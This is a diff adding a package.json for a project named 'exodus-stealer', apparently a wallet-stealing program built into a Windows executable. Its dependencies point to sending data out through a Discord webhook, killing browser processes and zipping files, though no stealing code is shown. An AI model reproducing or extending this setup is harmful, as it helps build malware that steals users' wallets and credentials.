@@ -1,0 +1,28 @@
+{
+  "name": "exodus-stealer",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "start": "babel-node src/index.js",
+    "start-build": "node bundle/index.js",
+    "babel-build": "babel src --out-dir bundle",
+    "build": "nexe -i bundle/index.js -o /dist/app.exe -t x64-14.15.3"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "adm-zip": "^0.5.9",
+    "browser-kill": "^1.0.2",
+    "discord-webhook-node": "^1.1.8",
+    "fkill": "^8.0.1",
+    "kill-chrome": "^2.2.0"
+  },
+  "devDependencies": {
+    "@babel/cli": "^7.17.10",
+    "@babel/core": "^7.17.10",
+    "@babel/node": "^7.17.10",
+    "@babel/preset-env": "^7.17.10"
+  }
+}
